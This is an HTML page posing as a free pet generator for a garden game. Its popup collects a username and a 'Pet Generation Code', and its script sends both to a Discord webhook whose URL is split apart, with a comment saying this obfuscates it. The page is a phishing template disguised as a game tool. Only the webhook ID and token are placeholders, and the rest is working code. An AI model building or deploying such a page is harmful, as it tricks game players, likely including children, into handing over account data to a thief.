<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Grow-a-Garden Pet Generator</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: linear-gradient(to bottom, #ebf8ff, #fff);
    color: #1e3a8a;
    margin: 0;
    padding: 0;
  }
  header {
    background: rgba(191, 219, 254, 0.9);
    backdrop-filter: blur(10px);
    padding: 16px;
    text-align: center;
    font-size: 1.5rem;
    font-weight: bold;
    border-bottom: 2px solid #93c5fd;
  }
  .container {
    max-width: 900px;
    margin: auto;
    padding: 20px;
  }
  .pets {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 20px;
  }
  .pet-card {
    background: #fff;
    border: 2px solid #93c5fd;
    border-radius: 12px;
    padding: 12px;
    text-align: center;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    animation: float 3s ease-in-out infinite;
  }
  .pet-card:hover {
    transform: translateY(-6px) scale(1.05);
    box-shadow: 0 8px 16px rgba(37, 99, 235, 0.2);
  }
  .pet-card img {
    width: 80px;
    height: 80px;
    object-fit: contain;
  }
  .pet-card input {
    width: 100%;
    margin-top: 8px;
    padding: 6px;
    border-radius: 8px;
    border: 1px solid #93c5fd;
  }
  .selected {
    border-color: #2563eb;
    box-shadow: 0 0 12px rgba(37, 99, 235, 0.6);
  }
  button {
    padding: 10px 16px;
    margin-top: 12px;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    background: linear-gradient(to right, #2563eb, #1e40af);
    color: white;
    font-size: 1rem;
    transition: background 0.3s, transform 0.2s;
  }
  button:hover {
    background: linear-gradient(to right, #1d4ed8, #1e3a8a);
    transform: scale(1.05);
  }
  #popup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.6);
    justify-content: center;
    align-items: center;
    animation: fadein 0.3s ease;
  }
  #popup .popup-content {
    background: white;
    padding: 20px;
    border-radius: 12px;
    width: 300px;
    animation: slideup 0.4s ease;
  }
  #popup input {
    width: 100%;
    margin-top: 8px;
    padding: 6px;
    border-radius: 6px;
    border: 1px solid #93c5fd;
  }
  .tutorial {
    margin-top: 40px;
    padding: 20px;
    background: #f0f9ff;
    border-radius: 12px;
    border: 2px solid #93c5fd;
  }
  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }
  @keyframes fadein {
    from { opacity: 0; }
    to { opacity: 1; }
  }
  @keyframes slideup {
    from { transform: translateY(40px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
  }
</style>
</head>
<body>
  <header>ðŸŒ± Grow-a-Garden: Pet Generator</header>

  <div class="container">
    <h2>Select Your Pet</h2>
    <div class="pets" id="petGrid"></div>

    <div style="margin-top:20px; text-align:center;">
      <button onclick="openPopup()">Generate Pet</button>
    </div>

    <div class="tutorial">
      <h3>ðŸ“º Tutorial</h3>
      <p>Watch this video before generating your pet:</p>
      <iframe width="100%" height="315" src="https://www.youtube.com/embed/dnBvM1z-1yo" frameborder="0" allowfullscreen></iframe>
    </div>
  </div>

  <div id="popup">
    <div class="popup-content">
      <h3>Enter Your Details</h3>
      <input type="text" id="username" placeholder="Username" />
      <input type="text" id="code" placeholder="Pet Generation Code" />
      <button onclick="submitData()">Submit</button>
    </div>
  </div>

<script>
  const pets = [
    { id: 'sprout-cat', img: 'https://placekitten.com/100/100', name: 'Sprout Cat' },
    { id: 'bud-bunny', img: 'https://placekitten.com/101/100', name: 'Bud Bunny' },
    { id: 'pond-pup', img: 'https://placekitten.com/102/100', name: 'Pond Pup' },
    { id: 'cactus-hedgie', img: 'https://placekitten.com/103/100', name: 'Cactus Hedgie' },
    { id: 'beetle-buddy', img: 'https://placekitten.com/104/100', name: 'Beetle Buddy' },
    { id: 'owl-orchid', img: 'https://placekitten.com/105/100', name: 'Owl Orchid' }
  ];

  let selectedPet = pets[0].id;

  const petGrid = document.getElementById('petGrid');

  pets.forEach(pet => {
    const div = document.createElement('div');
    div.className = 'pet-card';
    if (pet.id === selectedPet) div.classList.add('selected');
    div.innerHTML = `
      <img src="${pet.img}" alt="${pet.name}" />
      <div>${pet.name}</div>
      <input type="text" value="${pet.name}" onchange="renamePet('${pet.id}', this.value)" />
    `;
    div.onclick = () => selectPet(pet.id);
    petGrid.appendChild(div);
  });

  function selectPet(id) {
    selectedPet = id;
    document.querySelectorAll('.pet-card').forEach(card => card.classList.remove('selected'));
    document.querySelectorAll('.pet-card')[pets.findIndex(p => p.id === id)].classList.add('selected');
  }

  function renamePet(id, newName) {
    const pet = pets.find(p => p.id === id);
    if (pet) pet.name = newName;
  }

  function openPopup() {
    document.getElementById('popup').style.display = 'flex';
  }

  async function submitData() {
    const username = document.getElementById('username').value.trim();
    const code = document.getElementById('code').value.trim();
    if (!username || !code) return;

    // Obfuscate webhook URL by splitting
    const part1 = "https://discord.com/api/webhooks/";
    const part2 = "YOUR_WEBHOOK_ID";
    const part3 = "/YOUR_WEBHOOK_TOKEN";
    const webhookURL = part1 + part2 + part3;

    const payload = {
      content: `New Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
    };

    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    alert('Pet generated and sent to Discord!');
    document.getElementById('popup').style.display = 'none';
  }
</script>

</body>
</html>
